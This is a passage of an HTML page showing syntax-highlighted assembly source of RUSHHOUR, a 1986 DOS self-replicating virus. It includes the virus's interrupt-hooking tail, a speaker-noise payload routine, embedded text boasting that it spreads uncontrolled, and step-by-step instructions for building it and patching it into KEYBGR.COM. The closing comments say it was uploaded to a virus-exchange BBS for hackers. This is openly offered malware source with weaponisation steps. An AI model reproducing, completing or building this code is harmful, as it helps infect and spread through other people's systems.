             </span><span class="sc6">JMP</span><span class="sc0">         </span><span class="sc5">DOS_VECTOR</span><span class="sc0">             </span><span class="sc1">; normal function execution</span><span class="sc0">

</span><span class="sc5">VIRUS</span><span class="sc0">        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc10">ERROR</span><span class="sc0">        </span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc10">FAR</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">                               </span><span class="sc1">; simply ignore all</span><span class="sc0">
                                                </span><span class="sc1">; errors...</span><span class="sc0">
</span><span class="sc10">ERROR</span><span class="sc0">        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">DISEASE</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc10">FAR</span><span class="sc0">
             </span><span class="sc9">ASSUME</span><span class="sc0">      </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">

             </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; These registers will be</span><span class="sc0">
                                                </span><span class="sc1">; destroyed!</span><span class="sc0">

             </span><span class="sc6">TEST</span><span class="sc0">        </span><span class="sc5">PRESET</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0">          </span><span class="sc5">EXIT_2</span><span class="sc0">
             </span><span class="sc6">TEST</span><span class="sc0">        </span><span class="sc5">ACTIVE</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">JZ</span><span class="sc0">          </span><span class="sc5">EXIT_2</span><span class="sc0">

             </span><span class="sc6">IN</span><span class="sc0">          </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">                 </span><span class="sc1">; Enable speaker</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc0">                </span><span class="sc1">; ( Bit 0 := 0 )</span><span class="sc0">
             </span><span class="sc6">OUT</span><span class="sc0">         </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; index loop CX</span><span class="sc0">

</span><span class="sc5">NOISE</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">RNDVAL</span><span class="sc0">              </span><span class="sc1">;     :</span><span class="sc0">
             </span><span class="sc6">XOR</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">RNDVAL</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;     :</span><span class="sc0">
             </span><span class="sc6">SHL</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; generate NOISE</span><span class="sc0">
             </span><span class="sc6">SHL</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;     :</span><span class="sc0">
             </span><span class="sc6">RCL</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RNDVAL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;     :</span><span class="sc0">
             </span><span class="sc6">RCL</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">RNDVAL</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;     :</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc5">RNDVAL</span><span class="sc0">              </span><span class="sc1">; output some bit</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">         </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; of the feedback</span><span class="sc0">
             </span><span class="sc6">IN</span><span class="sc0">          </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">61H</span><span class="sc0">                 </span><span class="sc1">; shift register</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FDH</span><span class="sc0">                </span><span class="sc1">; --&gt; noise from speaker</span><span class="sc0">
             </span><span class="sc6">OR</span><span class="sc0">          </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
             </span><span class="sc6">OUT</span><span class="sc0">         </span><span class="sc2">61H</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">EXIT_2</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">CX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">         </span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">         </span><span class="sc5">VIDEO_VECTOR</span><span class="sc0">           </span><span class="sc1">; jump to the normal</span><span class="sc0">
                                                </span><span class="sc1">; VIDEO routine.....</span><span class="sc0">
</span><span class="sc5">DISEASE</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'This program is a VIRUS program.'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'Once activated it has control over all'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'system devices and even over all storage'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'media inserted by the user. It continually'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'copies itself into uninfected operating'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'systems and thus spreads uncontrolled.'</span><span class="sc0">


             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'The fact that the virus does not destroy any'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'user programs or erase the disk is merely due'</span><span class="sc0">
             </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'to a philanthropic trait of the author......'</span><span class="sc0">

             </span><span class="sc9">ORG</span><span class="sc0">         </span><span class="sc2">1C2AH</span><span class="sc0">

</span><span class="sc5">VIRUS_ENDE</span><span class="sc0">   </span><span class="sc9">LABEL</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">

             </span><span class="sc9">END</span><span class="sc0">

</span><span class="sc1">; To get an executable program:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1.) Assemble and link source</span><span class="sc0">
</span><span class="sc1">; 2.) Rename EXE file to COM!</span><span class="sc0">
</span><span class="sc1">; 3.) Load renamed EXE file into DEBUG</span><span class="sc0">
</span><span class="sc1">; 4.) Reduce register CX to 300H</span><span class="sc0">
</span><span class="sc1">; 5.) Write COM file to disk with "w"</span><span class="sc0">
</span><span class="sc1">; 6.) Load COM file virus in DEBUG</span><span class="sc0">
</span><span class="sc1">; 7.) Load KEYBGR.COM</span><span class="sc0">
</span><span class="sc1">; 8.) Change addresses 71Eh ff. as follows:</span><span class="sc0">
</span><span class="sc1">;     71EH: 33 C0 8E C0 0E 1F 26</span><span class="sc0">
</span><span class="sc1">; 9.) Write KEYBGR.COM to disk with a length of 1B2A bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Source code RUSHHOUR.ASM -- (C) 1986, foxi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Taken from book "Computer Viruses - a high-tech disease"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Source retyped by -=&gt; CyberZone &lt;=- Jon A Johnson</span><span class="sc0">
</span><span class="sc1">; U/l to Virus Exchange BBS - Sofia, Bulgaria</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; "Have fun all you Hackers. hahaha" --&gt;JAJ&lt;--</span><span class="sc0">
</span></div></body>
</html>
